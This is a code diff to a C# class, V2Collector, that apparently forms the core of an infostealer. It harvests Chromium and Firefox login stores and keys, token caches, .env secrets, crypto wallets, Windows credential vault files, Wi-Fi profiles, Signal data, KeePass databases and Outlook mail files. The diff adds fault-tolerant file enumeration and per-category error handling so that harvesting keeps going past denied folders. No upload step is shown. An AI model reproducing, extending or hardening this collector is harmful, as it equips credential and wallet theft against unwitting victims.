@@ -42,6 +42,46 @@ public sealed class V2Collector
         Directory.CreateDirectory(_tempRoot);
     }
 
+    /// <summary>
+    /// Enumerates files while skipping directories the process cannot read and reparse
+    /// points such as the legacy "My Music" junctions. A single denied folder must never
+    /// abort a collection run.
+    /// </summary>
+    private static IEnumerable<string> EnumerateFilesSafe(string root, string pattern, bool recurse, int limit)
+    {
+        if (string.IsNullOrWhiteSpace(root) || !Directory.Exists(root)) yield break;
+        var options = new EnumerationOptions
+        {
+            RecurseSubdirectories = recurse,
+            IgnoreInaccessible = true,
+            AttributesToSkip = FileAttributes.ReparsePoint | FileAttributes.System,
+            MatchCasing = MatchCasing.CaseInsensitive,
+        };
+        IEnumerator<string>? enumerator = null;
+        try { enumerator = Directory.EnumerateFiles(root, pattern, options).GetEnumerator(); }
+        catch { yield break; }
+        using (enumerator)
+        {
+            for (int count = 0; count < limit; count++)
+            {
+                string current;
+                try
+                {
+                    if (!enumerator.MoveNext()) break;
+                    current = enumerator.Current;
+                }
+                catch { break; }
+                yield return current;
+            }
+        }
+    }
+
+    private static string[] DirectoriesSafe(string root)
+    {
+        try { return Directory.GetDirectories(root); }
+        catch { return Array.Empty<string>(); }
+    }
+
     public async Task<V2CollectionBundle> CollectAsync(V2CollectionRequest request, CancellationToken ct)
     {
         var started = DateTimeOffset.UtcNow;
@@ -49,20 +89,25 @@ public sealed class V2Collector
         {
             var categories = new HashSet<string>(request.Categories ?? Array.Empty<string>(), StringComparer.OrdinalIgnoreCase);
             bool Want(string category) => categories.Count == 0 || categories.Contains(category);
+            void Run(string label, Action action)
+            {
+                try { action(); }
+                catch (Exception ex) { _errors.Add($"{label}: {ex.Message}"); }
+            }
 
-            if (Want("system")) CollectSystem();
-            if (Want("browser")) CollectBrowsers(ct);
-            if (Want("token")) CollectTokens();
-            if (Want("secret")) CollectSecrets();
-            if (Want("wallet")) CollectWallets();
-            if (Want("credential")) CollectWindowsCredentials();
-            if (Want("wifi")) CollectWifi();
-            if (Want("signal")) CollectSignal();
-            if (Want("vault")) CollectVault();
-            if (request.Tier != V2CollectionTier.T0 && Want("password")) CollectPasswordManagers();
-            if (request.Tier != V2CollectionTier.T0 && Want("email")) CollectEmail();
-            if (request.Tier != V2CollectionTier.T0 && Want("game")) CollectGames();
-            if (request.Tier != V2CollectionTier.T0 && Want("files")) CollectFiles(ct);
+            if (Want("system")) Run("system", CollectSystem);
+            if (Want("browser")) Run("browser", () => CollectBrowsers(ct));
+            if (Want("token")) Run("token", CollectTokens);
+            if (Want("secret")) Run("secret", CollectSecrets);
+            if (Want("wallet")) Run("wallet", CollectWallets);
+            if (Want("credential")) Run("credential", CollectWindowsCredentials);
+            if (Want("wifi")) Run("wifi", CollectWifi);
+            if (Want("signal")) Run("signal", CollectSignal);
+            if (Want("vault")) Run("vault", CollectVault);
+            if (request.Tier != V2CollectionTier.T0 && Want("password")) Run("password", CollectPasswordManagers);
+            if (request.Tier != V2CollectionTier.T0 && Want("email")) Run("email", CollectEmail);
+            if (request.Tier != V2CollectionTier.T0 && Want("game")) Run("game", CollectGames);
+            if (request.Tier != V2CollectionTier.T0 && Want("files")) Run("files", () => CollectFiles(ct));
 
             var manifest = new V2CollectionManifest
             {
@@ -143,7 +188,7 @@ public sealed class V2Collector
                 byte[]? key = ReadChromiumKey(localState);
                 AddFile(localState, "browser", name + "-local-state");
 
-                var profiles = Directory.GetDirectories(root)
+                var profiles = DirectoriesSafe(root)
                     .Where(d => Path.GetFileName(d).StartsWith("Default", StringComparison.OrdinalIgnoreCase) ||
                                 Path.GetFileName(d).StartsWith("Profile", StringComparison.OrdinalIgnoreCase))
                     .ToList();
@@ -242,7 +287,7 @@ public sealed class V2Collector
         foreach (string root in roots)
         {
             if (!Directory.Exists(root)) continue;
-            foreach (string profile in Directory.GetDirectories(root))
+            foreach (string profile in DirectoriesSafe(root))
             {
                 foreach (string file in new[] { "logins.json", "key4.db", "cookies.sqlite", "places.sqlite", "prefs.js" })
                 {
@@ -274,7 +319,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories)
+                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                              .Where(f => f.EndsWith(".ldb", StringComparison.OrdinalIgnoreCase) ||
                                          f.EndsWith(".log", StringComparison.OrdinalIgnoreCase) ||
                                          f.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
@@ -315,7 +360,7 @@ public sealed class V2Collector
             if (File.Exists(path)) CollectSecretFile(path, "secret");
             else if (Directory.Exists(path))
             {
-                foreach (string file in Directory.EnumerateFiles(path, "*", SearchOption.TopDirectoryOnly).Take(30))
+                foreach (string file in EnumerateFilesSafe(path, "*", false, 30))
                     CollectSecretFile(file, "secret");
             }
         }
@@ -328,7 +373,7 @@ public sealed class V2Collector
                  })
         {
             if (!Directory.Exists(root)) continue;
-            foreach (string file in Directory.EnumerateFiles(root, ".env", SearchOption.AllDirectories).Take(20))
+            foreach (string file in EnumerateFilesSafe(root, ".env", true, 20))
                 CollectSecretFile(file, "secret");
         }
     }
@@ -368,7 +413,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories)
+                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                              .Where(IsWalletFile).Take(200))
                     AddFile(file, "wallet", "wallet-" + Path.GetFileName(file));
             }
@@ -376,7 +421,7 @@ public sealed class V2Collector
         }
         try
         {
-            foreach (string file in Directory.EnumerateFiles(profile, "wallet.dat", SearchOption.AllDirectories).Take(20))
+            foreach (string file in EnumerateFilesSafe(profile, "wallet.dat", true, 20))
                 AddFile(file, "wallet", "wallet-" + Path.GetFileName(file));
         }
         catch { }
@@ -410,7 +455,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories).Take(3000))
+                foreach (string file in EnumerateFilesSafe(root, "*", true, 3000))
                 {
                     if (ct.IsCancellationRequested) return;
                     if (!extensions.Contains(Path.GetExtension(file))) continue;
@@ -530,7 +575,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories).Take(100))
+                foreach (string file in EnumerateFilesSafe(root, "*", true, 100))
                     AddFile(file, "credential", "vault-" + Path.GetFileName(file));
             }
             catch { }
@@ -553,7 +598,7 @@ public sealed class V2Collector
             };
             using var process = Process.Start(psi);
             process?.WaitForExit(8000);
-            foreach (string xml in Directory.EnumerateFiles(dir, "*.xml"))
+            foreach (string xml in EnumerateFilesSafe(dir, "*.xml", false, 1000))
             {
                 try
                 {
@@ -588,7 +633,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories)
+                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                              .Where(f => f.EndsWith(".json", StringComparison.OrdinalIgnoreCase) ||
                                          f.EndsWith(".sqlite", StringComparison.OrdinalIgnoreCase) ||
                                          f.EndsWith(".db", StringComparison.OrdinalIgnoreCase) ||
@@ -613,7 +658,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*.kdbx", SearchOption.AllDirectories).Take(20))
+                foreach (string file in EnumerateFilesSafe(root, "*.kdbx", true, 20))
                     AddFile(file, "password", "keepass-" + Path.GetFileName(file));
             }
             catch { }
@@ -636,7 +681,7 @@ public sealed class V2Collector
             if (!Directory.Exists(root)) continue;
             try
             {
-                foreach (string file in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories)
+                foreach (string file in EnumerateFilesSafe(root, "*", true, 100_000)
                              .Where(f => f.EndsWith(".ost", StringComparison.OrdinalIgnoreCase) ||
                                          f.EndsWith(".pst", StringComparison.OrdinalIgnoreCase) ||
                                          f.EndsWith("logins.json", StringComparison.OrdinalIgnoreCase) ||
